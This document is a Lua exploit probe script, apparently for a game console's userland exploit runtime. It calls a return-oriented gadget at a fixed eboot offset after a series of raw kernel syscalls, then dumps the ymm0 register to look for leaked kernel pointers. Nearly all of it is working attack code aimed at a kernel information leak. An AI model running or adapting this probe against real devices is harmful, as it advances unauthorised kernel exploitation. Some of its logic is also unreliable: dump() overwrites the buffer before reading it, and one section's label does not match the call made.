-- CRASH_CLASS: SAFE  (one instruction plus its trailing ret in eboot: vmovups [rsi],ymm0 ; ret)
-- PROBE 1187a: H1 first contact - does ymm0 hold anything interesting when we come back from the kernel?
-- 1186a dumped 1 MB of eboot and capstone found exactly two clean ymm-store gadgets, of which
--   eboot+0xF7CB7:  vmovups ymmword ptr [rsi], ymm0 ; ret
-- needs no other register. So: put our buffer in rsi, call it, read 32 bytes. If the kernel used 256-bit AVX and
-- never issued vzeroupper, the value is whatever the kernel last left there.
-- Sections run in this order and each prints immediately, so a death localises itself.
print("=== PROBE 1187a: ymm0 SPILL TEST ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function hexn(n) n=N(n) return string.format("0x%08X%08X", math.floor(n/4294967296), n % 4294967296) end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local base_e = 0
pcall(function() base_e = N(eboot_base) end)
local GADGET = base_e + 0xF7CB7
print("[A] eboot_base=" .. hexn(base_e) .. " gadget=" .. hexn(GADGET))
local P = memory.alloc(0x100)
local B = N(P)
print("[A] buffer=" .. hexn(B))
local function fill(v) for i=0,0x3C,4 do pcall(function() memory.write_dword(B+i, v) end) end end
local function dump(tag)
  fill(0xC0C0C0C0)
  local o, buf = pcall(function() return memory.read_buffer(B, 32) end)
  if not o or type(buf) ~= "string" or #buf ~= 32 then print(tag .. " READ-FAIL"); return end
  local hex = string.gsub(buf, ".", function(c) return string.format("%02x", string.byte(c)) end)
  local q = ""
  local kq = 0
  for i=0,3 do
    local lo = string.byte(buf, i*8+1) + string.byte(buf, i*8+2)*256 + string.byte(buf, i*8+3)*65536 + string.byte(buf, i*8+4)*16777216
    local hi = string.byte(buf, i*8+5) + string.byte(buf, i*8+6)*256 + string.byte(buf, i*8+7)*65536 + string.byte(buf, i*8+8)*16777216
    q = q .. string.format(" %08X%08X", hi, lo)
    if hi >= 0xFFFF8000 then kq = kq + 1 end
  end
  print(string.format("%s %s kernellike=%d", tag, hex, kq))
  print("   qwords:" .. q)
end
local function spill()
  pcall(function() native.fcall_with_rax(GADGET, nil, nil, U(B), nil, nil, nil, nil) end)
end
-- [1] baseline, no syscall of ours yet
fill(0xC0C0C0C0)
spill()
dump("[1] baseline")
-- [2] immediately again: if this differs from [1], the fcall machinery itself clobbers ymm0
fill(0xC0C0C0C0)
spill()
dump("[2] repeat ")
-- [3] after a syscall that copies real kernel bytes (638 writes 16 B of the timezone table)
local s638 = mk(638)
local rout = memory.alloc(0x40)
local ob = N(rout)
fill(0xC0C0C0C0)
local rv = 0
pcall(function() rv = N(s638(U(1000000000), U(0), U(ob), U(0))) end)
spill()
dump("[3] after638")
print(string.format("[3] rv=%d", rv))
-- [4] after getdirentries on /dev
local s196 = mk(196)
local fd = 0
local o1, v1 = pcall(function() return s196(U(0), U(0), U(0), U(0), U(0), U(0)) end)
print("[4] open-ish rv=" .. tostring(o1 and N(v1) or "err"))
spill()
dump("[4] after196")
-- [5] after a 622 control call (kernel object path)
local s622 = mk(622)
fill(0xC0C0C0C0)
pcall(function() s622(U(0), U(0), U(0), U(0), U(0), U(0)) end)
spill()
dump("[5] after622")
-- [6] tight loop of syscalls then spill
local s232 = mk(232)
for i=1,8 do pcall(function() s232(U(B), U(0)) end) end
spill()
dump("[6] after232")
print("[Z] alive")
print("=== DONE ===")
